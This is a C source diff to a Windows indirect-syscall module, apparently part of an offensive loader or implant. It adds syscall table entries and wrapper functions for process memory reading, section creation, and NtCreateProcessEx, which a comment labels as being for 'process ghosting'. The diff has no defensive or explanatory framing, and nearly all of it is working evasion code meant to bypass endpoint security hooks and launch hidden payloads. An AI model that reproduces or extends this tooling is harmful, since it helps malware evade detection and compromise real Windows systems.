@@ -66,6 +66,8 @@ typedef struct _SYSCALL_TABLE {
     SYSCALL_ENTRY  NtSetInformationThread;
     SYSCALL_ENTRY  NtQueryObject;
     SYSCALL_ENTRY  NtAdjustPrivilegesToken;
+    SYSCALL_ENTRY  NtCreateProcessEx;
+    SYSCALL_ENTRY  NtSetInformationProcess;
 } SYSCALL_TABLE, *PSYSCALL_TABLE;
 
 /* ── Global syscall table ────────────────────────────────────────────────── */
@@ -272,6 +274,8 @@ BOOL IndirectSyscallInit(void)
     RESOLVE(NtQueryObject);
     RESOLVE(NtAdjustPrivilegesToken);
     RESOLVE(NtOpenThread);
+    RESOLVE(NtCreateProcessEx);
+    RESOLVE(NtSetInformationProcess);
 #undef RESOLVE
 
     return g_SysTable.IndirectAddr != NULL;
@@ -437,4 +441,61 @@ NTSTATUS ISysNtResumeThread(HANDLE Thread, PULONG PrevCount)
                     g_SysTable.NtResumeThread.Ssn };
     SysSetConfig(&cfg);
     return ((NTSTATUS(*)(HANDLE,PULONG))SysInvoke)(Thread, PrevCount);
+}
+
+NTSTATUS ISysNtFreeVirtualMemory(
+    HANDLE Process, PVOID *Base, PSIZE_T Size, ULONG FreeType)
+{
+    SYS_CFG cfg = { g_SysTable.NtFreeVirtualMemory.SysAddr,
+                    g_SysTable.NtFreeVirtualMemory.Ssn };
+    SysSetConfig(&cfg);
+    return ((NTSTATUS(*)(HANDLE,PVOID*,PSIZE_T,ULONG))SysInvoke)
+           (Process, Base, Size, FreeType);
+}
+
+NTSTATUS ISysNtReadVirtualMemory(
+    HANDLE Process, PVOID Base, PVOID Buffer, SIZE_T Size, PSIZE_T Read)
+{
+    SYS_CFG cfg = { g_SysTable.NtReadVirtualMemory.SysAddr,
+                    g_SysTable.NtReadVirtualMemory.Ssn };
+    SysSetConfig(&cfg);
+    return ((NTSTATUS(*)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T))SysInvoke)
+           (Process, Base, Buffer, Size, Read);
+}
+
+NTSTATUS ISysNtCreateSection(
+    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
+    PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection,
+    ULONG AllocationAttributes, HANDLE FileHandle)
+{
+    SYS_CFG cfg = { g_SysTable.NtCreateSection.SysAddr, g_SysTable.NtCreateSection.Ssn };
+    SysSetConfig(&cfg);
+    return ((NTSTATUS(*)(PHANDLE,ACCESS_MASK,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE))SysInvoke)
+           (SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize,
+            SectionPageProtection, AllocationAttributes, FileHandle);
+}
+
+/* NtCreateProcessEx — create a process from a section handle (process ghosting) */
+NTSTATUS ISysNtCreateProcessEx(
+    PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
+    HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle,
+    HANDLE DebugPort, HANDLE ExceptionPort, BOOLEAN InJob)
+{
+    SYS_CFG cfg = { g_SysTable.NtCreateProcessEx.SysAddr, g_SysTable.NtCreateProcessEx.Ssn };
+    SysSetConfig(&cfg);
+    return ((NTSTATUS(*)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,ULONG,HANDLE,HANDLE,HANDLE,BOOLEAN))SysInvoke)
+           (ProcessHandle, DesiredAccess, ObjectAttributes, ParentProcess, Flags,
+            SectionHandle, DebugPort, ExceptionPort, InJob);
+}
+
+NTSTATUS ISysNtSetInformationProcess(
+    HANDLE ProcessHandle, ULONG ProcessInformationClass,
+    PVOID ProcessInformation, ULONG ProcessInformationLength)
+{
+    SYS_CFG cfg = { g_SysTable.NtSetInformationProcess.SysAddr,
+                    g_SysTable.NtSetInformationProcess.Ssn };
+    SysSetConfig(&cfg);
+    return ((NTSTATUS(*)(HANDLE,ULONG,PVOID,ULONG))SysInvoke)
+           (ProcessHandle, ProcessInformationClass, ProcessInformation,
+            ProcessInformationLength);
 }
